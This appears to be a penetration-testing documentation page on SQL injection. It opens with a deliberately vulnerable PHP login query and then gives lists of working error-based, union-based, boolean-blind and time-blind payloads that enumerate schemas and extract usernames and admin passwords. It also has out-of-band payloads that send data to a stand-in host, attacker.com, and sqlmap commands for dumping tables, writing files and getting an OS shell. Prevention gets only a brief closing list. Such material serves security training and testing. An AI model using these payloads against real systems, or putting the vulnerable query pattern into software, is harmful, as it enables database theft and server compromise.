---
sidebar_position: 10
---
# SQL Injection (SQLi)

SQL Injection (SQLi) is a code injection technique that allows an attacker to interfere with the queries an application makes to its database. This enables them to view data they are not normally able to retrieve, alter sensitive information, execute administrative operations on the database, and in some cases, issue commands to the operating system. SQLi remains one of the most critical and widespread web vulnerabilities.

## How SQLi Works

SQLi occurs when a web application constructs SQL queries using user-supplied input without proper sanitization or validation. An attacker manipulates this input to inject malicious SQL code, changing the original query's logic.

### Example of a Vulnerable Query (PHP):
```php
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = $conn->query($sql);
```
If an attacker enters `' OR '1'='1` for `username`, the query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '$password'
```
The `OR '1'='1'` condition always evaluates to true, bypassing the intended authentication.

## Types of SQL Injection

SQLi attacks are broadly categorized by how an attacker retrieves data from the database.

### In-band SQLi (Error-based & Union-based)
Data is extracted using the same communication channel that the vulnerability exists in. This is the most common and straightforward type.  

#### Error-based SQLi
Injects malicious input that causes the database to throw an error message. This error often includes sensitive database information (e.g., table names, column names, or actual data) that the attacker can leverage.
**Detection Payloads**:
*   `' OR 1=1 -- ` (Classic bypass, watch for application behavior)
*   `' OR 1=1 LIMIT 1 -- ` (If the application expects a single result)
*   `'` (Single quote to break the query and observe errors)
*   `"` (Double quote)
*   `)` (Closing parenthesis)
*   `AND 1=CAST((SELECT @@version) AS INT)` (MySQL specific, attempts to cast a string into an integer, causing an error with the version string.)
*   `AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)` (MySQL specific, common for extracting data via error messages)
*   `' AND 1=CONVERT(int, (SELECT @@version)) --` (MSSQL specific)
*   `' AND 1=CAST((SELECT * FROM users) AS int) --` (Attempts to cast a table into an integer to force an error)  

**Exploitation**: Carefully crafted queries designed to extract specific data piece by piece through error messages.

#### Union-based SQLi
Uses the `UNION SELECT` statement to combine the results of two or more `SELECT` statements into a single result set. This allows the attacker to retrieve data from other tables, even if the original query was not designed for it.  

**Detection Steps**:
1.  **Find the number of columns**: Use `ORDER BY` clause to find the number of columns the original query selects.
                *   `' ORDER BY 1 -- `
                *   `' ORDER BY 2 -- ` (Continue incrementing until an error occurs; the last successful number is the column count).
                *   Alternatively, use `UNION SELECT NULL,NULL,NULL...` with varying numbers of NULLs until no error occurs.
2.  **Determine column types and data output positions**: Once the column count is known, use `UNION SELECT NULL, NULL, 'VULNERABLE', NULL...` to identify which columns display output in the application.
        *   **Exploitation Payloads (assuming 3 columns, 2nd column displays output)**:
            *   `' UNION SELECT NULL,VERSION(),NULL -- ` (Retrieve database version)
            *   `' UNION SELECT NULL,USER(),NULL -- ` (Retrieve current database user)
            *   `' UNION SELECT NULL,DATABASE(),NULL -- ` (Retrieve current database name)
            *   `' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=DATABASE() -- ` (MySQL: Enumerate tables in the current database)
            *   `' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users' -- ` (MySQL: Enumerate columns in the 'users' table)
            *   `' UNION SELECT NULL,username,password FROM users -- ` (MySQL: Extract data from `username` and `password` columns in the `users` table)
            *   For MSSQL, use `sys.tables` and `sys.columns` instead of `information_schema`.
            *   For PostgreSQL, use `pg_catalog.pg_tables` and `pg_catalog.pg_columns`.

### Inferential SQLi (Blind SQLi)
Data is not directly transferred via the web application. The attacker infers information about the database by observing the application's responses (e.g., boolean responses or time delays). This is slower but often effective against well-configured applications that suppress error messages.  

#### Boolean-based Blind SQLi
Sends SQL queries that force the application to return a different response (e.g., a "true" or "false" page, or a subtle change in content) depending on whether the injected condition is met.  

**Detection Payloads**:
*   `' AND 1=1 -- ` (Page loads normally)
*   `' AND 1=2 -- ` (Page loads differently or gives an error)
*   If these two payloads yield different results, boolean-based blind SQLi is likely present.  

**Exploitation Payloads (character-by-character extraction)**:
*   `' AND SUBSTRING(VERSION(),1,1)='5' -- ` (Is the first character of the version '5'?)
*   `' AND (SELECT COUNT(*) FROM users) > 0 -- ` (Is there at least one user?)
*   `' AND SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1),1,1)='a' -- ` (Is the first char of admin's password 'a'?)
*   This requires automated tools or extensive scripting.

#### Time-based Blind SQLi
Sends SQL queries that cause the database to delay its response based on whether a condition is true. The attacker observes these time delays to infer information.  

**Detection Payloads**:
*   `' AND SLEEP(5) -- ` (MySQL/PostgreSQL: Introduce a 5-second delay)
*   `' AND IF(1=1,SLEEP(5),0) -- ` (MySQL: If condition is true, sleep for 5 seconds)
*   `' WAITFOR DELAY '0:0:5' -- ` (MSSQL: Wait for 5 seconds)
*   `' pg_sleep(5) -- ` (PostgreSQL: Wait for 5 seconds)
*   If a 5-second delay is observed, time-based blind SQLi is likely present.  

**Exploitation Payloads (character-by-character extraction)**:
*   `' AND IF(SUBSTRING(VERSION(),1,1)='5',SLEEP(5),0) -- ` (MySQL: If the first char of version is '5', delay by 5 seconds)
*   `' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 1),1,1)='a',SLEEP(5),0) -- ` (MySQL: If first char of admin's password is 'a', delay)
*   This is extremely slow and almost always requires automation.

### Out-of-band SQLi
The database sends data to an external server controlled by the attacker. This type is less common and relies on specific database features being enabled (e.g., `LOAD_FILE` in MySQL, `UTL_HTTP` in Oracle, or DNS lookup capabilities).  

**Detection/Exploitation Payloads**:
*   **MySQL**: `LOAD_FILE(CONCAT('\\\\', (SELECT VERSION()), '.attacker.com\\share'))` (Forces a DNS lookup to attacker's server, leaking version in the DNS query).
*   **MSSQL**: `EXEC master..xp_dirtree '\\attacker.com\share'` or using `xp_cmdshell` for DNS exfiltration.
*   **Oracle**: `SELECT UTL_HTTP.REQUEST('http://attacker.com/data.txt') FROM DUAL;`

## Exploitation Workflow (General)

1.  **Identify Injection Point**: Find a parameter (URL, POST body, header, cookie) susceptible to SQLi.
2.  **Determine Injection Type**: Error-based, Union-based, Boolean-based, Time-based.
3.  **Fingerprint Database**: Identify the database management system (DBMS) (MySQL, PostgreSQL, MSSQL, Oracle) and its version. This dictates specific syntax and features you can use.
    *   `@@version` (MySQL, MSSQL)
    *   `version()` (PostgreSQL)
    *   `V$VERSION` (Oracle)
4.  **Enumerate Schema**:
    *   List all available databases.
    *   List tables within a selected database.
    *   List columns within a selected table.
    *   `information_schema` (MySQL/PostgreSQL), `sys.tables`/`sys.columns` (MSSQL), `ALL_TABLES`/`ALL_TAB_COLUMNS` (Oracle) are critical for this.
5.  **Extract Data**: Retrieve usernames, passwords, API keys, or any other sensitive data from the identified tables and columns.

## Advanced SQLi Techniques

*   **Stacked Queries**: Execute multiple SQL statements in a single request. (e.g., `'; INSERT INTO logs VALUES('Hacked!'); --`) Not all databases or APIs support this.
*   **Second-Order SQLi**: An injection that occurs not in the initial request, but when the application later reuses the stored, malicious data in a new query.
*   **SQLi to OS Command Execution**: Some databases (e.g., MySQL with `UDF` functions, MSSQL with `xp_cmdshell`) allow execution of operating system commands.
*   **File Read/Write**: Read arbitrary files from the server (`LOAD_FILE` in MySQL) or write files to the server (e.g., web shells).

## Tools for Exploitation

*   **sqlmap**: The most powerful and widely used open-source penetration testing tool that automates the detection and exploitation of SQL injection flaws.
    *   **Basic Usage**:
        ```bash
        sqlmap -u "https://example.com/vulnerable?id=1" --batch
        ```
        *   **`-u <URL>`**: Target URL.
        *   **`--batch`**: Never ask for user input, use default behavior.
    *   **Common Flags**:
        *   `-r <request_file>`: Load HTTP request from a file (e.g., from Burp Suite).
        *   `--data="id=1"`: Use POST data.
        *   `--cookie="PHPSESSID=..."`: Inject via cookie.
        *   `--current-db`: Enumerate current database.
        *   `--dbs`: Enumerate databases.
        *   `--tables -D <db_name>`: Enumerate tables in a database.
        *   `--columns -D <db_name> -T <table_name>`: Enumerate columns in a table.
        *   `--dump -D <db_name> -T <table_name> -C <column1,column2>`: Dump data from specific columns.
        *   `--dump-all`: Dump all data.
        *   `--file-read <path>`: Read an arbitrary file.
        *   `--file-write <local_path> --file-dest <remote_path>`: Write a file to the server.
        *   `--os-shell`: Get an OS shell (if possible).
        *   `--risk=3 --level=5`: Increase risk and level for deeper and more exhaustive tests.
        *   `--dbms=MySQL`: Force a specific DBMS.
        *   `--technique=B`: Force boolean-based blind SQLi. (Techniques: `B`oolean-based, `E`rror-based, `U`nion-based, `T`ime-based, `S`tacked queries, `O`ut-of-band)
        *   `--proxy "http://127.0.0.1:8080"`: Use a proxy like Burp Suite.

## Prevention (Briefly)

*   **Parameterized Queries / Prepared Statements**: The most effective defense. SQL code is defined first, then parameters are passed separately, preventing malicious input from altering query logic.
*   **Input Validation**: Whitelist input formats.
*   **Least Privilege**: Restrict database user permissions.
*   **Error Handling**: Avoid verbose error messages in production.